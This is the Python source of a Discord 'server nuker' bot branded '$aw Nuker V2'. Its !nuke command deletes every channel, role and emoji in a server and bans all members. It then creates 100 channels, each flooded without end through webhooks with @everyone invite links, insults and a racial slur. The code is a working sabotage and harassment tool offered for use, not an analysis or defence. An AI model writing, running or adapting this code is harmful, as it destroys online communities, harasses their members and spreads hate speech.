from pypresence import Presence 
import time

start = int(time.time())
client_id = "1046098122700488804" #your application's client id
RPC = Presence(client_id)
RPC.connect()


RPC.update(
        details = "Fucking all servers",
        large_image = "compressjpeg_online_512x512-image", #name of your asset
        large_text = "Saw is watching you",
        state = "SAW V2",
        start = start,
        buttons = [{"label": "Saw Discord", "url": "https://discord.gg/mtR6HmKBbY"}])
    


import discord
import colorama
from colorama import Fore as F, Style as S
colorama.init()
from colorama import init
init()
from colorama import Fore, Back, Style
from discord.ext import commands
import json

import os
colorama.init()
import json
import pypresence


r = F.RED
w = F.RESET
g = F.GREEN
c = F.CYAN

def ascii():
            print(Fore.RED + """

       ░██████╗░█████╗░░██╗░░░░░░░██╗  ██╗░░░██╗██████╗░
       ██╔════╝██╔══██╗░██║░░██╗░░██║  ██║░░░██║╚════██╗
       ╚█████╗░███████║░╚██╗████╗██╔╝  ╚██╗░██╔╝░░███╔═╝
       ░╚═══██╗██╔══██║░░████╔═████║░  ░╚████╔╝░██╔══╝░░
       ██████╔╝██║░░██║░░╚██╔╝░╚██╔╝░  ░░╚██╔╝░░███████╗
        ╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░  ░░░╚═╝░░░╚══════╝""")

ascii()
tokeninput = f'Token Bot= '
TOKEN = input(tokeninput)


os.system('cls')

def main():
    ()
    headers = {
        "Authorization" : TOKEN
    }
	
os.system('cls')	
os.system('title $aw Nuker V2')
ascii()
antinet = commands.Bot(command_prefix='!', intents = discord.Intents.all())

@antinet.event
async def on_ready():
    await antinet.change_presence(status=discord.Status.idle, activity=discord.Game('Join : https://discord.gg/jqFZSmDtuh'))
    print(Fore.RED + f'''
                    Welcome to $aw Server Nuker!

                    Type !nuke to nuke
                    Type !discord to get the discord
                    Type !info to get infos
                    Type !fun to get some fun features


''')

antinet.remove_command('help')

@antinet.command()
async def w(ctx, *, message):
    print(f'             {F.RESET}[{g}${F.RESET}] You Use : ! ')
    print(f'               {F.RESET}[{g}+{F.RESET}] Watching Text: {message}')
    print(' ')
    await ctx.message.delete()
    await antinet.change_presence(
	
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
			
        ))

@antinet.command()
async def clear(ctx):
    os.system('cls')
    print(Fore.RED + f'''
                    Welcome to $aw Server Nuker!

                    Type !nuke to nuke
                    Type !discord to get the discord
                    Type !info to get infos
                    Type !fun to get some fun features
''')
@antinet.command(aliases=['discord'])
async def ds(ctx):
  await ctx.send("****https://discord.gg/mtR6HmKBbY @everyone ****")

@antinet.command(aliases=['info'])
async def inf(ctx):
  await ctx.send("$aw V2 is made by Galintega @everyone")
  await ctx.send("https://cdn.discordapp.com/attachments/1046021660714750006/1046021860317462649/download.jpg saw is back")

@antinet.command(aliases=['fun'])
async def fn(ctx):
  await ctx.send("@everyone https://cdn.discordapp.com/attachments/1046021660714750006/1046023724522012672/wawa.png")
  await ctx.send("@everyone https://cdn.discordapp.com/attachments/1046021660714750006/1046023724522012672/wawa.png")
  await ctx.send("@everyone https://cdn.discordapp.com/attachments/1046021660714750006/1046023724522012672/wawa.png")
  await ctx.send("@everyone https://cdn.discordapp.com/attachments/1046021660714750006/1046023724522012672/wawa.png")
  await ctx.send("@everyone https://cdn.discordapp.com/attachments/1046021660714750006/1046023724522012672/wawa.png")
  await ctx.send("https://cdn.discordapp.com/attachments/1046021660714750006/1046023724522012672/wawa.png")

@antinet.command(aliases=['nuke'])

async def nuk(ctx):
  await ctx.message.delete()
  print(Fore.BLUE + 'Command Used: $n')
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
      print(Fore.BLUE + 'Channel Deleted')
    except Exception as e:
      print(f'               {F.RESET}[{r}-{F.RESET}] Channel NOT Deleted')

  for member in ctx.guild.members:
    try:
      await member.ban(reason='SAW JUST FUCKED YOU AND YOUR POOR ASS')
      print(Fore.BLUE + 'Member Banned')
    except Exception as e:
      print(Fore.BLUE + 'Member NOT Banned')

  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(Fore.BLUE + ' Role Deleted')
    except Exception as e:
      print(Fore.BLUE + ' Role NOT Deleted')

  for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
      print(Fore.BLUE + 'Emoji Deleted')
    except:
      print(Fore.BLUE + 'Emoji NOT Deleted')
	  
  for i in range(100):
    await ctx.guild.create_text_channel("Join")
    print(Fore.BLUE + 'Created Channel')

@antinet.event
async def on_guild_channel_create(channel):
  web = await channel.create_webhook(name="$aw")
  while True:
    await web.send('@everyone https://discord.gg/mtR6HmKBbY join or gay')
    await channel.send('Get fucked by saw hahahah')
    await web.send('SAW IS BACK NIGERSSSSSSSSSSSSSS')
    await web.send('@everyone https://discord.gg/mtR6HmKBbY join or gay')
    await channel.send('@everyone ez nuked lol ')
    await web.send('SAW IS BACK NIGERSSSSSSSSSSSSSS')



antinet.run(TOKEN)

